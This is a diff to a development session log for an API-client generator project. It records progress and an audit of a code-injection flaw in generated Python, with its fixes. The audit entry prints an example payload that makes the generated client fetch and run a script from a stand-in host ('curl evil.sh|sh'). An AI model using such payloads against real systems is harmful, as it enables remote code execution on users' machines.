@@ -8,11 +8,11 @@ Claude reads this at the START of every new session to understand what happened 
 ## Project State
 **Last updated:** 2026-10-19 (Session 12) — **Phase 3 in progress**
 **Current branch:** main
-**Overall status:** MVP is **complete and live-verified end-to-end, frontend included** (see Session 2 close, 2026-07-26). Vercel frontend (`https://relay-cyan-rho.vercel.app`) → Cloudflare Worker (`https://relay-worker.abhiram-dev.workers.dev`) → GitHub Actions → Docker sandbox → Gemini self-correction → KV, with per-IP rate limiting, run-id isolation, and a code viewer. A real browser run polls to `Succeeded` / `verified_pass` and shows the real generated client. Nothing in the MVP is claimed-but-unproven. Tests (as of Session 12): backend 139 · worker 52 · frontend 40 hermetic, all green.
+**Overall status:** MVP is **complete and live-verified end-to-end, frontend included** (see Session 2 close, 2026-07-26). Vercel frontend (`https://relay-cyan-rho.vercel.app`) → Cloudflare Worker (`https://relay-worker.abhiram-dev.workers.dev`) → GitHub Actions → Docker sandbox → Gemini self-correction → KV, with per-IP rate limiting, run-id isolation, and a code viewer. A real browser run polls to `Succeeded` / `verified_pass` and shows the real generated client. Nothing in the MVP is claimed-but-unproven. Tests (as of Session 12): backend 168 · worker 52 · frontend 40 hermetic, all green.
 
 **Phase 2 (scoped 2026-07-26, build starting Session 3, 2026-07-27):** BYOK security infrastructure → multi-provider LLM (Gemini/OpenAI/Anthropic/Grok/OpenRouter) → honest error taxonomy → full QA re-verification → visual/UX pass → `/security-review` + remediation → final retest and deliver. **Progress:** Step 1 (BYOK) CLOSED live (Session 4). Step 2 (multi-provider) CLOSED live (Session 6, commits `4866d2a`→`7f846fb`) — see Session 6 for the full receipt; one accepted gap logged there (corrector proven live independently of the deployed pipeline, not together in one run — no test-injection hook exists in the public API for that). Step 3 (honest error taxonomy) CLOSED (Session 7, commits `caf86cf`→`dc5e5cf`) — see Session 7 for the full receipt; one deliberate scope boundary logged there at the time (per-attempt corrector codes rendered as raw tokens in the compact attempts list), closed the next step (Step 4 gave `status.ts` labels to all 7 corrector codes). Step 4 (full QA pass) CLOSED (Session 8, commits `bbb35fd`→`572c18d`) — see Session 8 for the full receipt, including a real production bug (the Action's infra-failure watchdog silently overwriting every classified error) found live and fixed, not just a coverage-extension step. Step 5 (visual/UX pass) CLOSED (Session 9, commits `c21ca2a`→`8ce5b3d`) — see Session 9 for the full receipt and a logged pattern-to-watch (`status.ts` caught incomplete twice now). Step 6 (security review) CLOSED (Session 10, commits `03c8b2c`→`c09b7ee`) — see Session 10 for the full receipt, including a prominent standalone callout for F5 (the most severe finding in the project: RCE via generated code an end user downloads and trusts) and an explicit note that the scan's own adversarial verification panel never completed, substituted with an independent manual trace. **Step 7 (final retest, README, deliver) CLOSED (Session 11, commits `19b2a31`→`9e28f98`)** — see Session 11 for the full receipt, including a full residuals audit across Sessions 1–10 and two accumulated documentation inconsistencies caught and fixed. **Phase 2 is now fully closed** — every step has its own live receipt, nothing claimed-but-unproven remains.
 
-**Phase 3 (scoped 2026-10-19, in progress):** verified-live generation with per-operation receipts → generator fidelity → general param synthesis → target-API auth → receipt schema + MCP output. Design: ARCHITECTURE.md "Phase 3 — verified-live USP and target auth". Checklist: TODO.md Phase 3 sprint. **Progress:** pieces 0, 1, 2 (+2b, 2c), 3a, 3b and 3c are done (`e1ba802`→`bfe7d7f`, see Session 12). Next: piece 4 (generator fidelity). Open live-receipt gaps: OpenAI billing is inactive on the project's OpenAI key, so 3a and the 400 json_schema rule are hermetic-only.
+**Phase 3 (scoped 2026-10-19, in progress):** verified-live generation with per-operation receipts → generator fidelity → general param synthesis → target-API auth → receipt schema + MCP output. Design: ARCHITECTURE.md "Phase 3 — verified-live USP and target auth". Checklist: TODO.md Phase 3 sprint. **Progress:** pieces 0, 1, 2 (+2b, 2c), 3a, 3b, 3c and 4b are done (`e1ba802`→`2edfe6e`, see Session 12 and its addendum). Next: piece 4c (`params.py`). Open live-receipt gaps: OpenAI billing is inactive on the project's OpenAI key, so 3a and the 400 json_schema rule are hermetic-only.
 
 ---
 
@@ -329,7 +329,7 @@ This bug predates Step 3 — the race between the two steps' callbacks always ex
 
 **Scan verification method — read this before trusting any future "Step 6 re-run".** The plugin's scan produces unverified *candidate* findings, then runs those candidates through an adversarial verification panel (3 lens-verifiers per candidate, 2-of-3 vote) before anything is reported as confirmed. That panel hit a session usage limit mid-run and **never completed** — one notification even reported "completed" with a plausible-looking partial snippet, which was not trusted at face value; checking the scan directory directly (`CLAUDE-SECURITY-20260810-083352/`) confirmed no `findings.json`/`votes.json`/`coverage.json` was ever written, only the raw pre-panel `.claude-security-run/candidates.json` (9 candidates, F1–F9). **What actually verified these 9 findings was a manual, independent trace against the real source for every one of them — not the plugin's own panel.** This is a substitute verification method, not a run of the tool's adversarial review. If a future session wants a second opinion with the tool's actual multi-agent panel, that scan can still be resumed/rerun from scratch — this session's findings should not be read as "panel-verified."
 
-**F5 — code injection in generated Python source (the most severe finding in the project, escalated High).** The scanner's own candidate rated this **Medium**. The independent trace upgraded it to **High**, and it's worth stating plainly why: `generate.py`'s `generate_endpoint_client()` took OpenAPI path-template segments (`{petId}`), operation IDs, and query-parameter names — all attacker-controlled if the spec URL is attacker-controlled, which by this project's own design it always can be — and spliced them **directly as live Python source text** into the generated client: as f-string interpolation in the request path, as a bare identifier in the method's parameter list and `def` line, and as a dict-literal key for query params. A spec path like `/pet{__import__('os').system('curl evil.sh|sh')}` would not just fail to compile — it would **execute the moment the generated client's method runs**, because the templating step evaluated it as a live f-string, not literal text. The scanner's Medium rating undersells this because the *scan-time* self-correction path (LLM-written patches inside the sandbox) is at least contained by the Docker sandbox's network/resource caps — but this bug lives in the *generation* step itself, which also produces the exact `.py` files a real end user downloads via the CodeViewer and runs on their own machine, completely outside any sandbox. That download path has zero execution containment by design — it's meant to be a normal Python file a developer imports — so a malicious spec doesn't need to survive sandboxed self-correction at all to compromise a user; it just needs to be pointed at once. **Fix (`03c8b2c`):** every identifier that becomes Python source now goes through `_safe_identifier()` (bare-identifier regex + not a keyword, else a synthesized fallback name); every wire-visible string (the actual query-param name sent over HTTP) uses `repr()` instead of hand-spliced quotes; the path f-string is now built by `_safe_path_fstring()`, which only live-substitutes a `{name}` group if `name` is a real declared path parameter — anything else is escaped to a literal `{{name}}` and never evaluated. 4 new tests assert the malicious forms compile to inert, escaped, or `repr()`-quoted text with no live evaluation path, alongside the existing compile-check tests.
+**F5 — code injection in generated Python source (the most severe finding in the project, escalated High).** The scanner's own candidate rated this **Medium**. The independent trace upgraded it to **High**, and it's worth stating plainly why: `generate.py`'s `generate_endpoint_client()` took OpenAPI path-template segments (`{petId}`), operation IDs, and query-parameter names — all attacker-controlled if the spec URL is attacker-controlled, which by this project's own design it always can be — and spliced them **directly as live Python source text** into the generated client: as f-string interpolation in the request path, as a bare identifier in the method's parameter list and `def` line, and as a dict-literal key for query params. A spec path like `/pet{__import__('os').system('curl evil.sh|sh')}` would not just fail to compile — it would **execute the moment the generated client's method runs**, because the templating step evaluated it as a live f-string, not literal text. The scanner's Medium rating undersells this because the *scan-time* self-correction path (LLM-written patches inside the sandbox) is at least contained by the Docker sandbox's network/resource caps — but this bug lives in the *generation* step itself, which also produces the exact `.py` files a real end user downloads via the CodeViewer and runs on their own machine, completely outside any sandbox. That download path has zero execution containment by design — it's meant to be a normal Python file a developer imports — so a malicious spec doesn't need to survive sandboxed self-correction at all to compromise a user; it just needs to be pointed at once. **Fix (`03c8b2c`):** every identifier that becomes Python source now goes through `_safe_identifier()` (bare-identifier regex + not a keyword, else a synthesized fallback name); every wire-visible string (the actual query-param name sent over HTTP) uses `repr()` instead of hand-spliced quotes; the path f-string is now built by `_safe_path_fstring()`, which only live-substitutes a `{name}` group if `name` is a real declared path parameter — anything else is escaped to a literal `{{name}}` and never evaluated. 4 new tests assert the malicious forms compile to inert, escaped, or `repr()`-quoted text with no live evaluation path, alongside the existing compile-check tests. **Correction (Session 12, 2026-10-19):** this fix was incomplete. It missed two spec-text splice points: a `"` in a path key closed the URL string, so the rest of the path ran as code whenever the generated method was called (reachable from a public spec URL; prance and openapi-spec-validator accept such a path), and `info.title` went raw into the module docstring (not exploitable only because `from __future__ import annotations` happened to follow it). Both fixed in `2edfe6e`; see the Session 12 addendum.
 
 **Other findings, fixed in the order the user set (F5/F3/F2/F9/F8/F6 batch, then F7's cheap half):**
 - **F3 (Medium) — `byok-key` callback route failed open, not closed, on a missing `CALLBACK_SECRET`.** New `isAuthorizedCallback()` in `byok.js` returns `false` immediately if the secret isn't configured, instead of comparing against `undefined` (`854c328`).
@@ -398,8 +398,9 @@ and the OpenAI-family adapter, and scope the target-API auth design before any c
 - Worker deployed: version `fa935278-3e3a-4c19-a406-5e5a9a5acb0d`. The
   `/api/runs/x/byok-key` propagation probe returned 401.
 - Deployed `/api/models` with a real key returned 70 ids, 0 non-chat, 0 known-dead.
-- Vercel had created no deployment for `bfe7d7f` when last checked. Unresolved; Vercel settings were
-  not touched.
+- Vercel never created a deployment for `bfe7d7f` itself. `61d9eeb`, pushed later the same day,
+  deployed to Production (deployment 7173701745, status success) and contains the same frontend
+  changes. Vercel settings were not touched.
 
 **Tests:** backend **139** · worker **52** · frontend **40** (was 83 · 50 · 37 at Session 11).
 `tsc --noEmit` and `next lint` clean.
@@ -438,5 +439,55 @@ families. See ARCHITECTURE.md Phase 3 (d).
 
 **Next piece:** Piece 4, generator fidelity. Honor `required` (`generate.py:179`), arrays/enums and
 `explode: false` in `_py_type` (`generate.py:86`), and test on ~30 real specs.
+
+### Session 12 addendum — 2026-10-19 — pieces 4a (recon) and 4b (generator hardening) (Claude Code)
+**4a — recon, read-only, no commit.** Read `generate.py`, `ci_runner.py`, `sandbox/runner.py` and
+`test_generate.py`, and ran real and inline specs through the generator without sandbox or LLM.
+Main findings, all feeding pieces 4c–4e in TODO.md:
+- Swagger 2.0 specs generate 0 of 20 operations, and `run()` would report "succeeded".
+- Path-item-level `parameters` and `servers` are ignored. The `_DEMO_TARGETS` base URL exists only
+  because Open-Meteo declares `servers` at path-item level.
+- A relative `servers` URL (`/api/v3`) reaches the sandbox host check and is reported
+  `ssrf_blocked`.
+- OpenAPI 3.1 `type` arrays crashed `_py_type` and failed the whole run.
+- Header and cookie params are dropped from the method, but `_required_kwargs` still passes them.
+- Required non-identifier param names get kwargs keyed by the wire name, which the method rejects.
+- Booleans go out as `True`/`False`, and arrays always go out as repeated keys.
+
+**4b — generator hardening (`2edfe6e`).** The Session 10 F5 fix missed two spec-text splice points:
+- **Path quote.** A `"` in a path key closed the URL string, and the rest of the path ran as code
+  whenever the generated method was called. It is reachable from a public spec URL: prance and
+  openapi-spec-validator both accept such a path. Reproduced against the old generator with a
+  canary file.
+- **Title.** `info.title` went raw into the module docstring. It was not exploitable only because
+  `from __future__ import annotations` happened to follow it, making any injected statement a
+  SyntaxError.
+
+Fixed in `2edfe6e`:
+- path f-string escaping (quotes, backslashes, stray braces, non-printables);
+- title sanitising (`_safe_docstring_text`);
+- identifier sanitising for class and model names (`_safe_class_name`);
+- per-operation exception isolation. The reason carries the exception type only, and `ci_runner`
+  prints it to the Action log with the path `repr()`'d;
+- `compile()` of both generated files before they are returned;
+- a pure `assert_generated_source_inert` AST checker (`backend/tests/source_inert.py`);
+- a 13-payload hostile-spec canary test that imports and calls every generated module in a
+  subprocess. 8 of the 13 payloads fail against the old generator.
+
+Valid specs generate identical output (Open-Meteo, Petstore v3, the `test_generate` fixture),
+ignoring datamodel-codegen's timestamp line.
+
+**Receipts:**
+- CI run 39259745779 on `2edfe6e`: success.
+- `scripts/verify_deployed.sh` against the deployed Worker: exit 0, "ALL CHECKS PASSED".
+  - Run `b3265031-a81c-4558-9777-2659cc0f641a` (generate.yml 39259859182) and run
+    `0818cb04-3fa2-4921-9f26-4d426e40eb61` (generate.yml 39259865397) both ended `succeeded` with
+    `/v1/forecast` `verified_pass`.
+  - The rate-limit step got HTTP 202 then 429. The 202 dispatched a third run (generate.yml
+    39260024163), which the script does not poll. It completed with success.
+
+**Tests:** backend **168** · worker **52** · frontend **40**.
+
+**Next piece:** 4c, `params.py` (hermetic, not wired in). See TODO.md Phase 3 sprint.
 
 <!-- Copy the block above for each new session -->
